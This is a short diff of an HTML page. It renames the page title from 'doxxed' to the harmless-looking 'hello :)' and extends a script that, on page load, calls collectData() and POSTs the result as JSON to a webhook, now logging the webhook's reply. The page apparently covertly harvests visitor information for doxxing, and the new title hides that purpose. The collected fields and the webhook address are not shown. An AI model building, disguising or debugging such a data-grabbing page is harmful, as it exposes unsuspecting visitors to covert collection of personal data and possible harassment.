@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>doxxed</title>
+  <title>hello :)</title>
   <style>
     body {
       margin: 0;
@@ -72,7 +72,13 @@
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(data)
-      }).catch(err => console.error('Errore invio dati:', err));
+      })
+      .then(response => {
+        console.log('Dati inviati, risposta webhook:', response.status);
+        return response.text();
+      })
+      .then(text => console.log('Risposta webhook (testo):', text))
+      .catch(err => console.error('Errore invio dati:', err));
     }
 
     collectData();
